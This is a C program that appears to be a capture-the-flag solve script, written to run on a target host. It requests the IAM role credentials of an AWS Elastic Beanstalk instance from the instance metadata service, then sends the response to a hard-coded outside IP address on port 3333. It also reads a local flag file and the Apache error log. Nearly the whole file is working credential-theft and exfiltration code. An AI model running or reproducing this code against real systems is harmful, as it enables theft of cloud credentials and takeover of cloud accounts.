// gcc solve.c -o solve -static
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h> 
#include <fcntl.h>

void error(const char *msg) { perror(msg); exit(0); }
int perr(char *msg){
	fprintf(stderr, msg, strlen(msg));
}

int leak(char* host, char *buf, int size){
    struct hostent *server;
    struct sockaddr_in serv_addr;
    int sockfd;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    server = gethostbyname(host);

    memset(&serv_addr,0,sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(3333);
    memcpy(&serv_addr.sin_addr.s_addr,server->h_addr,server->h_length);

    connect(sockfd,(struct sockaddr *)&serv_addr,sizeof(serv_addr));

    write(sockfd, buf, size);

    close(sockfd);
}

int makeHttpRequest(char *host, char *get_message, int msg_size){
    struct hostent *server;
    struct sockaddr_in serv_addr;
    int portno = 80;
    int sockfd, bytes, sent, received, total, message_size;
    char *message;
    char response[4096];

    message=malloc(msg_size);
    memset(message, 0, msg_size);
    strcpy(message, get_message);

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    server = gethostbyname(host);

    memset(&serv_addr,0,sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(portno);
    memcpy(&serv_addr.sin_addr.s_addr,server->h_addr,server->h_length);

    connect(sockfd,(struct sockaddr *)&serv_addr,sizeof(serv_addr));
    total = strlen(message);
    sent = 0;
    do {
        bytes = write(sockfd,message+sent,total-sent);
        if (bytes < 0)
            error("ERROR writing message to socket");
        if (bytes == 0)
            break;
        sent+=bytes;
    } while (sent < total);

    memset(response,0,sizeof(response));
    total = sizeof(response)-1;
    received = 0;
    do {
        bytes = read(sockfd,response+received,total-received);
        if (bytes < 0)
            error("ERROR reading response from socket");
        if (bytes == 0)
            break;
        received+=bytes;
    } while (received < total);

    perr(response);
    leak("52.78.113.184", response, 20000);
    close(sockfd);
    free(message);
}

int readFile(char *path){
    fprintf(stderr, "\n");
    char buf[1000] = {0,};
    int fd = open(path, O_RDONLY, 0644);
    fprintf(stderr, "open : %d\n", fd);
    read(fd, buf, 1000);
    perr(buf);
    close(fd);
}

int main(int argc,char *argv[])
{
    // intented
    makeHttpRequest("169.254.169.254", 
    "GET /latest/meta-data/iam/security-credentials/aws-elasticbeanstalk-ec2-role/ HTTP/1.1\r\nHost: 169.254.169.254\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\nConnection: close\r\n\r\n", 
    20000);

    // test for unintended    
    readFile("./flag");
    readFile("/var/log/httpd/error_log");

    return 0;
}
